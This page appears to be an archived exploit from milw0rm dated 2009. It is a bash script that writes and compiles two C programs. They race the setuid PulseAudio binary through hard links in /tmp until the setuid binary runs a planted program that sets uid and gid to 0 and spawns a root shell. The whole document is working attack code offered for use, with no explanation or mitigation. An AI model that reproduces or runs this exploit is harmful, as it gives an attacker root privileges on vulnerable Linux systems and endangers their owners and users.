<html><head><title>PulseAudio setuid Local Privilege Escalation Exploit</title></head><pre>#!/bin/bash

pulseaudio=`which pulseaudio`
workdir=&quot;/tmp&quot;
#workdir=$HOME
id=`which id`
shell=`which sh`

trap cleanup INT

function cleanup()
{
	rm -f $workdir/sh $workdir/sh.c $workdir/pa_race $workdir/pa_race.c 
	rm -rf $workdir/PATMP*
}

cat &gt; $workdir/pa_race.c &lt;&lt; __EOF__
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;

#define PULSEAUDIO_PATH		&quot;$pulseaudio&quot;
#define SH_PATH			&quot;$workdir/sh&quot;
#define TMPDIR_TEMPLATE		&quot;$workdir/PATMPXXXXXX&quot;

void _pause(long sec, long usec);

int main(int argc, char *argv[], char *envp[])
{
	int   status;
	pid_t pid;
	char  template[sizeof(TMPDIR_TEMPLATE)];
	char *tmpdir;
	char  hardlink[sizeof(template) + 2];
	char  hardlink2[sizeof(template) + 12];
	
	srand(time(NULL));
	
	for( ; ; )
	{
		snprintf(template, sizeof(template), &quot;%s&quot;, TMPDIR_TEMPLATE);
		template[sizeof(template) - 1] = '\0';
		
		tmpdir = mkdtemp(template);
		if(tmpdir == NULL)
		{
			perror(&quot;mkdtemp&quot;);
			return 1;
		}
	
		snprintf(hardlink, sizeof(hardlink), &quot;%s/A&quot;, tmpdir);
		hardlink[sizeof(hardlink) - 1] = '\0';
	
		snprintf(hardlink2, sizeof(hardlink2), &quot;%s/A (deleted)&quot;, tmpdir);
		hardlink2[sizeof(hardlink2) - 1] = '\0';
	
		/* this fails if $workdir is a different partition */
		if(link(PULSEAUDIO_PATH, hardlink) == -1)
		{
			perror(&quot;link&quot;);
			return 1;
		}
		
		if(link(SH_PATH, hardlink2) == -1)
		{
			perror(&quot;link&quot;);
			return 1;
		}
		
		pid = fork();
		
		if(pid == 0)
		{
			char *argv[] = {hardlink, NULL};
			char *envp[] = {NULL};

			execve(hardlink, argv, envp);
			
			perror(&quot;execve&quot;);
			return 1;
		}
		
		if(pid == -1)
		{
			perror(&quot;fork&quot;);
			return 1;
		}
		else
		{
			/* tweak this if exploit does not work */
			_pause(0, rand() % 500);
			
			if(unlink(hardlink) == -1)
			{
				perror(&quot;unlink&quot;);
				return 1;
			}
	
			if(link(SH_PATH, hardlink) == -1)
			{
				perror(&quot;link&quot;);
				return 1;
			}
			waitpid(pid, &amp;status, 0);
		}
		
		if(unlink(hardlink) == -1)
		{
			perror(&quot;unlink&quot;);
			return 1;
		}
		
		if(unlink(hardlink2) == -1)
		{
			perror(&quot;unlink&quot;);
			return 1;
		}
		
		if(rmdir(tmpdir) == -1)
		{
			perror(&quot;rmdir&quot;);
			return 1;
		}
	}
		
	return 0;
}

void _pause(long sec, long usec)
{
	struct timeval timeout;
	
	timeout.tv_sec  = sec;
	timeout.tv_usec = usec;
	
	if(select(0, NULL, NULL, NULL, &amp;timeout) == -1)
	{
		perror(&quot;select&quot;);
	}
}
__EOF__

cat &gt; $workdir/sh.c &lt;&lt; __EOF__
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;


int main(int argc, char *argv[], char *envp[])
{
	if(geteuid() != 0)
	{
		return 1;
	}

	setuid(0);
	setgid(0);

	if(fork() == 0)
	{
		argv[0] = &quot;$id&quot;;
		argv[1] = NULL;
		execve(argv[0], argv, envp);
		return 1;
	}

	argv[0] = &quot;$shell&quot;;
	argv[1] = NULL;
	execve(argv[0], argv, envp);
	return 1;
}
__EOF__

gcc -o $workdir/pa_race $workdir/pa_race.c
gcc -o $workdir/sh $workdir/sh.c

$workdir/pa_race

# milw0rm.com [2009-07-20]</pre></html>